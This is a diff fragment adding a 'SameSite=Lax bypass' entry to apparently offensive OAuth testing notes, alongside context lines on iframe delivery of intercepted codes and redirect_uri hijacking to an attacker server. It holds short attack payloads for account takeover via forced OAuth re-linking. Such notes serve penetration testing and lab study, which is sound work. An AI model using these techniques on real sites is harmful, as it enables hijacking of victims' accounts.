@@ -161,6 +161,17 @@ POST /authenticate → Change email to victim@example.com → Keep original toke
 Intercept /oauth-linking?code=X → Drop request → Create <iframe src="...?code=X"> → Deliver to victim
 ```
 
+**SameSite=Lax Bypass (Re-Linking via Same-Origin Primitive):**
+```
+SameSite=Lax blocks cross-site sub-requests but allows top-level GETs.
+If you have a same-origin injection point (stored XSS, open redirect, AngularJS ng-include):
+  window.location = '/accounts/oauth2/<provider>/callback/?code=<ATTACKER_CODE>'
+→ victim's Lax cookies are sent (same-origin top-level nav)
+→ callback links attacker's external identity to victim session
+→ attacker logs in via provider, is now authenticated as victim (often admin)
+Requires: missing/unvalidated state parameter. SameSite=Strict DOES block this.
+```
+
 **redirect_uri Hijacking:**
 ```
 Test redirect_uri=attacker-server in Repeater → Create iframe → Deliver → Use stolen code in /oauth-callback?code=X
